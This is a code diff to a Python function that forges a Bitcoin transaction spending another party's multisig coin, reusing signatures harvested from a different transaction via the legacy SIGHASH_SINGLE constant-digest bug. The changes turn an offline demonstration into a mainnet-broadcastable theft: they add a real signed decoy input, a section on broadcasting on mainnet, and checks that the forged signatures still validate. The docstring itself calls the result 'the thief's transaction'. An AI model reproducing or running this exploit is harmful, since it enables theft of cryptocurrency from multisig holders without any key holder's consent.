@@ -650,17 +650,31 @@ def forge_from_harvest(
     network: str = 'mainnet',
     fee: int = 1000,
     decoy_txid: Optional[str] = None,
+    decoy_vout: int = 0,
+    decoy_script: Optional[bytes] = None,
+    decoy_value: int = 0,
+    decoy_key: Optional[int] = None,
 ) -> ReplayResult:
-    """Build the thief's transaction from harvested signatures.
+    """Spend a multisig coin using signatures harvested from another transaction.
 
-    The target input is placed at an index with **no matching output**, which is
-    the whole condition.  Because the signatures were made over the constant
-    digest, they validate here regardless of the destination or the amount --
-    the coin is spent without any key holder signing this transaction.
+    The target input sits at index 1, and the transaction has a single output,
+    so index 1 has no matching output -- the whole precondition for the bug.
+    Because the harvested signatures were made over the constant digest they
+    validate here regardless of destination or amount, so the coin is spent
+    without any key holder signing this transaction.
 
-    Needs ``m`` harvested signatures that verify under distinct template keys,
-    since ``OP_CHECKMULTISIG`` requires ``m`` valid signatures in the same order
-    as the keys in the redeem script.
+    Needs ``m`` harvested signatures verifying under distinct redeem-script
+    keys, since ``OP_CHECKMULTISIG`` wants ``m`` signatures in key order.
+
+    Broadcasting on mainnet
+    -----------------------
+    A node checks *every* input against the UTXO set, so the decoy at index 0
+    must be a real, unspent output -- otherwise the transaction is rejected
+    with ``bad-txns-inputs-missingorspent`` and the signature is never examined.
+    Pass ``decoy_script`` (its scriptPubKey) and ``decoy_key`` (your key for it)
+    and the decoy is signed with ``SIGHASH_ALL``; ``decoy_value`` then adds to
+    the spendable total.  Without them the decoy keeps a synthetic outpoint,
+    which is correct for an offline demonstration and will not broadcast.
     """
     from .wallet import address_to_script  # local import to avoid a cycle
 
@@ -669,13 +683,13 @@ def forge_from_harvest(
     redeem = harvests[0].redeem_script
     m, n, pubkeys = parse_multisig_redeem_script(redeem)
 
-    # Pick one signature per signing key, ordered as in the redeem script.
-    chosen = []
+    # One signature per signing key, ordered as in the redeem script.
+    chosen: List[Harvest] = []
     for key_index in range(n):
         if len(chosen) == m:
             break
         for harvest in harvests:
-            if key_index in harvest.verifying_keys:
+            if key_index in harvest.verifying_keys and harvest not in chosen:
                 chosen.append(harvest)
                 break
     if len(chosen) < m:
@@ -683,38 +697,70 @@ def forge_from_harvest(
             'need %d signatures over distinct keys, found %d' % (m, len(chosen))
         )
 
+    if decoy_key is not None and decoy_script is None:
+        raise ValueError('decoy_key needs decoy_script (the scriptPubKey it signs)')
+    if decoy_script is not None and decoy_key is None:
+        raise ValueError(
+            'decoy_script needs decoy_key: the decoy input must be signed, or the '
+            'transaction cannot be broadcast'
+        )
+
     if decoy_txid is None:
         decoy_txid = '33' * 32
+
+    outputs_total = decoy_value + value - fee
+    if outputs_total <= 0:
+        raise ValueError(
+            'decoy_value + value (%d) must exceed the fee (%d)'
+            % (decoy_value + value, fee)
+        )
+
     target = TxIn(prev_txid, prev_vout, 0xFFFFFFFF)
-    tx = Transaction(
+    unsigned = Transaction(
         version=2,
-        inputs=[TxIn(decoy_txid, 0, 0xFFFFFFFF), target],
-        outputs=[TxOut(value - fee, address_to_script(destination, network))],
+        inputs=[TxIn(decoy_txid, decoy_vout, 0xFFFFFFFF), target],
+        outputs=[TxOut(outputs_total, address_to_script(destination, network))],
         locktime=0,
     )
 
-    # Every signature must still validate in the forged transaction.
-    digest = tx.sighash_legacy(1, redeem, chosen[0].sighash_type)
-    for harvest, key_index in zip(chosen, [i for i in range(n)]):
-        valid = verify_z(
+    # The harvested signatures must still validate in the forged transaction.
+    digest = unsigned.sighash_legacy(1, redeem, chosen[0].sighash_type)
+    if digest != SIGHASH_SINGLE_BUG_DIGEST:
+        raise ValueError(
+            'the target input must have no matching output: got digest %d, '
+            'expected the uint256::ONE constant' % digest
+        )
+    for harvest, key_index in zip(chosen, range(n)):
+        if not verify_z(
             decode_point(pubkeys[key_index]),
             harvest.signature[0],
             harvest.signature[1],
             digest,
-        )
-        if not valid:
+        ):
             raise ValueError(
                 'harvested signature does not validate in the forged transaction'
             )
+
+    # The decoy, when supplied, is a normal SIGHASH_ALL spend.
+    decoy_script_sig = b''
+    if decoy_script is not None and decoy_key is not None:
+        decoy_digest = unsigned.sighash_legacy(0, decoy_script, SIGHASH_ALL)
+        r, s = sign_z(decoy_key, decoy_digest)
+        decoy_script_sig = push_data(der_encode(r, s, SIGHASH_ALL)) + push_data(
+            private_key_to_public_key(decoy_key)
+        )
 
     script_sig = multisig_script_sig(
         [(h.signature[0], h.signature[1], h.sighash_type) for h in chosen], redeem
     )
     forged = Transaction(
-        tx.version,
-        [tx.inputs[0], TxIn(prev_txid, prev_vout, 0xFFFFFFFF, script_sig=script_sig)],
-        tx.outputs,
-        tx.locktime,
+        unsigned.version,
+        [
+            TxIn(decoy_txid, decoy_vout, 0xFFFFFFFF, script_sig=decoy_script_sig),
+            TxIn(prev_txid, prev_vout, 0xFFFFFFFF, script_sig=script_sig),
+        ],
+        unsigned.outputs,
+        unsigned.locktime,
     )
     return ReplayResult(
         digest_used=digest,
